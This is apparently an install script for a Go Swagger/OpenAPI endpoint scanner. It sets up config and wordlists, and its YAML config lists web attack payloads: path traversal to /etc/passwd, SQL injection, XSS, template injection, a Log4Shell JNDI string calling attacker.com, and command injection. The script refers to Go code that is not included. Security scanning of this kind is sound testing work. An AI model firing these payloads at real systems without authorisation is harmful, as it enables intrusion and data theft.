#!/bin/bash
# install.sh

echo "Installing Swagger Vulnerability Scanner..."

# Install Go if not present
if ! command -v go &> /dev/null; then
    echo "Go not found. Please install Go first: https://golang.org/dl/"
    exit 1
fi

# Create directory structure
mkdir -p swaggerdz/{wordlists,config,results}
cd swaggerdz

# Create go.mod
cat > go.mod << 'EOF'
module swaggerdz

go 1.21

require (
    github.com/projectdiscovery/subfinder/v2 v2.6.3
    github.com/go-resty/resty/v2 v2.11.0
    github.com/logrusorgru/aurora v2.0.3+incompatible
    github.com/remeh/sizedwaitgroup v1.0.0
    github.com/rs/zerolog v1.31.0
    golang.org/x/net v0.19.0
    golang.org/x/time v0.5.0
    gopkg.in/yaml.v3 v3.0.1
)
EOF

# Download dependencies
go mod download

# Create default config
cat > config/config.yaml << 'EOF'
subfinder:
  sources: []
  recursive: false
  all: false
  threads: 10
  timeout: 30
  max_enumeration: 10

scanner:
  threads: 50
  timeout: 30
  rate_limit: 5
  depth: 3
  follow_redirect: true
  retries: 3
  user_agents:
    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
    - "Swagger-UI/1.0"
    - "PostmanRuntime/7.28.4"
  proxy: ""

swagger:
  common_paths:
    - "/swagger.json"
    - "/swagger.yaml"
    - "/swagger.yml"
    - "/api/swagger.json"
    - "/api-docs"
    - "/openapi.json"
    - "/openapi.yaml"
    - "/v2/api-docs"
    - "/v3/api-docs"
    - "/swagger-ui.html"
    - "/swagger-resources/configuration/ui"
  extensions:
    - ".json"
    - ".yaml"
    - ".yml"
  max_depth: 5
  test_endpoints: true
  test_payloads:
    - "../../../../etc/passwd"
    - "' OR '1'='1"
    - "<script>alert(1)</script>"
    - "${7*7}"
    - "${jndi:ldap://attacker.com/a}"
    - "||ping -c 10 127.0.0.1||"
    - "1; SELECT SLEEP(5)"

output:
  directory: "results"
  formats:
    - "json"
    - "html"
    - "md"
  verbose: false
  save_raw: true

wordlists:
  subdomains: "wordlists/subdomains.txt"
  swagger_paths: "wordlists/swagger_paths.txt"
  common_files: "wordlists/common_files.txt"
EOF

# Download wordlists
cd wordlists
curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt

cat > swagger_paths.txt << 'EOF'
/swagger.json
/swagger.yaml
/swagger.yml
/api/swagger.json
/api/swagger.yaml
/api/swagger.yml
/v1/swagger.json
/v2/swagger.json
/v3/swagger.json
/api/v1/swagger.json
/api/v2/swagger.json
/api/v3/swagger.json
/docs/swagger.json
/docs/swagger.yaml
/docs/swagger.yml
/api-docs/swagger.json
/api-docs/swagger.yaml
/api-docs/swagger.yml
/openapi.json
/openapi.yaml
/openapi.yml
/api/openapi.json
/api/openapi.yaml
/api/openapi.yml
/v1/api-docs
/v2/api-docs
/v3/api-docs
/swagger-ui.html
/swagger/index.html
/api/swagger-ui.html
/swagger/ui/index
/swagger-resources/configuration/ui
/swagger-resources/configuration/security
/swagger-resources
/api/swagger-resources
/api-docs/swagger-resources
EOF

curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o common_files.txt
cd ..

# Copy the Go code
# (Copy the corrected Go code from above into swaggerdz.go)

# Build
echo "Building scanner..."
go build -o swaggerdz
# Make executable
chmod +x swaggerdz

echo "Installation complete!"
echo "Usage: ./swaggerdz -d example.com"
